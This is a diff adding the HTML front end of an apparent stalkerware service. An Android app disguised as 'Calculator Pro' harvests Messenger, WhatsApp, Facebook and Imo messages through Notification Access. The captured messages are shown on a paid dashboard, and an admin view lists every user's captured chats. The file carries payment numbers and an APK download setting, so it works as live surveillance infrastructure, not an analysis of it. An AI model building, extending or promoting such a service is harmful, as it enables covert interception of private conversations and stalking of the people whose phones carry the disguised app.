@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SpyApp Admin Dashboard</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <main>
+    <section id="authView">
+      <section class="hero">
+        <div class="hero-inner">
+          <div class="hero-copy">
+            <p class="eyebrow">Calculator Pro Dashboard</p>
+            <h1>মেসেজ দেখার নিরাপদ ড্যাশবোর্ড</h1>
+            <p>প্রথমে Android অ্যাপ ডাউনলোড করে ইনস্টল করুন, প্রয়োজনীয় পারমিশন চালু করুন, তারপর একই ইমেইল ও পাসওয়ার্ড দিয়ে ড্যাশবোর্ডে লগইন করে মেসেজ দেখুন।</p>
+            <div class="hero-actions">
+              <button id="downloadAppButton" type="button">অ্যাপ ডাউনলোড করুন</button>
+              <a href="#manualSection" class="ghost-link">ইউজার ম্যানুয়াল দেখুন</a>
+            </div>
+            <p id="downloadMessage" class="download-message"></p>
+          </div>
+          <div class="hero-preview">
+            <div class="phone-frame">
+              <div class="phone-screen">
+                <span class="calc-display">2,450</span>
+                <div class="calc-grid">
+                  <span></span><span></span><span></span><b></b>
+                  <span></span><span></span><span></span><b></b>
+                  <span></span><span></span><span></span><b></b>
+                  <span class="wide"></span><span></span><b></b>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="manualSection" class="shell landing-grid">
+        <div class="manual-card">
+          <p class="eyebrow">ব্যবহার নির্দেশিকা</p>
+          <h2>কীভাবে ব্যবহার করবেন</h2>
+          <ol class="manual-list">
+            <li>প্রথমে এই ওয়েবসাইটের “অ্যাপ ডাউনলোড করুন” বাটন থেকে Calculator Pro অ্যাপ ডাউনলোড করুন।</li>
+            <li>অ্যাপটি ফোনে ইনস্টল করুন এবং আপনার ইমেইল ও পাসওয়ার্ড দিয়ে রেজিস্ট্রেশন করুন।</li>
+            <li>অ্যাপ ওপেন করার পর প্রয়োজনীয় Notification Access পারমিশন চালু করুন। পারমিশন চালু না করলে মেসেজ দেখা যাবে না।</li>
+            <li>এরপর এই ওয়েব ড্যাশবোর্ডে একই ইমেইল ও পাসওয়ার্ড দিয়ে লগইন করুন।</li>
+            <li>ড্যাশবোর্ডে Messenger, WhatsApp, Facebook, Imo এবং Others আলাদা আলাদা ট্যাবে মেসেজ দেখতে পারবেন।</li>
+            <li>ফ্রি ইউজার ১০টি মেসেজ দেখতে পারবেন। বেশি মেসেজ দেখতে মাসিক সাবস্ক্রিপশন নিতে হবে।</li>
+          </ol>
+        </div>
+
+        <form id="loginForm" class="panel login-panel">
+          <p class="eyebrow">Dashboard Login</p>
+          <h2>লগইন করুন</h2>
+          <label>
+            Email
+            <input id="emailInput" type="email" autocomplete="email" required>
+          </label>
+          <label>
+            Password
+            <input id="passwordInput" type="password" autocomplete="current-password" required>
+          </label>
+          <button type="submit">Log in</button>
+          <p id="loginError" class="error"></p>
+        </form>
+      </section>
+    </section>
+
+    <section id="dashboardView" class="shell hidden">
+      <header class="topbar">
+        <div>
+          <p class="eyebrow" id="roleLabel">Dashboard</p>
+          <h1 id="dashboardTitle">Messages</h1>
+        </div>
+        <button id="logoutButton" class="ghost">Logout</button>
+      </header>
+
+      <nav id="userNav" class="tabs">
+        <button data-tab="messages" class="active">Messages</button>
+        <button data-tab="plans">Payment</button>
+      </nav>
+
+      <nav id="superNav" class="tabs hidden">
+        <button data-admin-tab="users" class="active">Users</button>
+        <button data-admin-tab="payments">Payments</button>
+        <button data-admin-tab="allMessages">All Messages</button>
+        <button data-admin-tab="settings">Settings</button>
+      </nav>
+
+      <section id="summaryPanel" class="summary-grid"></section>
+
+      <section id="messagesTab" class="workspace">
+        <aside class="sidebar">
+          <button data-platform="Messenger" class="platform active">Messenger</button>
+          <button data-platform="WhatsApp" class="platform">WhatsApp</button>
+          <button data-platform="Facebook" class="platform">Facebook</button>
+          <button data-platform="Imo" class="platform">Imo</button>
+          <button data-platform="Other" class="platform">Others</button>
+        </aside>
+        <div class="content">
+          <div class="status-row">
+            <div>
+              <span id="subscriptionBadge" class="badge">Free</span>
+              <span id="messageCounter" class="muted">0 messages</span>
+            </div>
+            <span id="accessHint" class="muted"></span>
+          </div>
+          <div id="subscriptionProgress" class="subscription-progress hidden">
+            <div class="progress-label">
+              <span id="remainingDaysText">0 days remaining</span>
+              <span id="expiryText"></span>
+            </div>
+            <div class="progress-track"><span id="remainingDaysBar"></span></div>
+          </div>
+          <div id="messageList" class="message-list"></div>
+        </div>
+      </section>
+
+      <section id="plansTab" class="workspace hidden">
+        <div class="content full">
+          <div class="section-heading">
+            <div>
+              <h2>Monthly Subscription</h2>
+              <p class="muted">Choose a package, send money, then submit the transaction details for admin review.</p>
+            </div>
+            <a class="support-link" href="https://wa.me/8801627957310?text=Hello%2C%20I%20need%20support%20for%20my%20Calculator%20Pro%20subscription." target="_blank" rel="noreferrer">WhatsApp support</a>
+          </div>
+
+          <div id="paymentStatusPanel" class="payment-status hidden"></div>
+
+          <div class="plans">
+            <label class="plan-card featured">
+              <input type="radio" name="plan" value="messenger" checked>
+              <span>
+                <strong>Messenger</strong>
+                <small>Messenger messages unlocked</small>
+              </span>
+              <b>1000 BDT/mo</b>
+            </label>
+            <label class="plan-card">
+              <input type="radio" name="plan" value="messenger_whatsapp">
+              <span>
+                <strong>Messenger + WhatsApp</strong>
+                <small>Best for two-channel monitoring</small>
+              </span>
+              <b>1500 BDT/mo</b>
+            </label>
+            <label class="plan-card">
+              <input type="radio" name="plan" value="all">
+              <span>
+                <strong>All Platforms</strong>
+                <small>Messenger, WhatsApp, Facebook, Imo and Others</small>
+              </span>
+              <b>2500 BDT/mo</b>
+            </label>
+          </div>
+
+          <div class="payment-info">
+            <div><span>bKash</span><strong>01703334975</strong></div>
+            <div><span>Rocket</span><strong>01703334975</strong></div>
+            <div><span>Nagad</span><strong>01703334975</strong></div>
+            <p class="muted">Send money first, then submit the sender phone number and transaction ID.</p>
+          </div>
+
+          <form id="paymentForm" class="payment-form">
+            <label>
+              Sender phone number
+              <input id="senderPhoneInput" type="tel" required>
+            </label>
+            <label>
+              Transaction ID
+              <input id="transactionIdInput" type="text" required>
+            </label>
+            <button type="submit">Submit payment request</button>
+          </form>
+          <div id="paymentMessage" class="success-highlight hidden"></div>
+        </div>
+      </section>
+
+      <section id="usersTab" class="workspace hidden">
+        <div class="content full">
+          <h2>Users</h2>
+          <div id="userList" class="admin-list"></div>
+        </div>
+      </section>
+
+      <section id="paymentsTab" class="workspace hidden">
+        <div class="content full">
+          <h2>Payment Requests</h2>
+          <div id="paymentList" class="admin-list"></div>
+        </div>
+      </section>
+
+      <section id="allMessagesTab" class="workspace hidden">
+        <aside class="sidebar">
+          <label>
+            Select user
+            <select id="adminUserSelect"></select>
+          </label>
+          <button data-admin-platform="Messenger" class="admin-platform active">Messenger</button>
+          <button data-admin-platform="WhatsApp" class="admin-platform">WhatsApp</button>
+          <button data-admin-platform="Facebook" class="admin-platform">Facebook</button>
+          <button data-admin-platform="Imo" class="admin-platform">Imo</button>
+          <button data-admin-platform="Other" class="admin-platform">Others</button>
+        </aside>
+        <div class="content">
+          <div class="status-row">
+            <div>
+              <span id="adminMessageUser" class="badge">User</span>
+              <span id="adminMessageCounter" class="muted">0 messages</span>
+            </div>
+            <div class="admin-actions compact">
+              <button id="deleteSelectedUserMessages" class="danger" type="button">Delete this user's messages</button>
+              <button id="deleteAllMessages" class="danger" type="button">Delete all users' messages</button>
+            </div>
+          </div>
+          <div id="adminMessageList" class="message-list"></div>
+        </div>
+      </section>
+
+      <section id="settingsTab" class="workspace hidden">
+        <div class="content full">
+          <h2>Website Settings</h2>
+          <form id="settingsForm" class="payment-form">
+            <label>
+              Google Drive app download link
+              <input id="downloadLinkInput" type="url" placeholder="https://drive.google.com/..." />
+            </label>
+            <button type="submit">Save download link</button>
+          </form>
+          <p id="settingsMessage" class="success"></p>
+        </div>
+      </section>
+    </section>
+  </main>
+
+  <div id="confirmModal" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
+    <div class="modal">
+      <h2 id="confirmTitle">Confirm payment request</h2>
+      <p id="confirmText"></p>
+      <div class="modal-actions">
+        <button id="confirmCancel" class="ghost" type="button">Cancel</button>
+        <button id="confirmSubmit" type="button">Confirm submit</button>
+      </div>
+    </div>
+  </div>
+
+  <script type="module" src="app.js"></script>
+</body>
+</html>
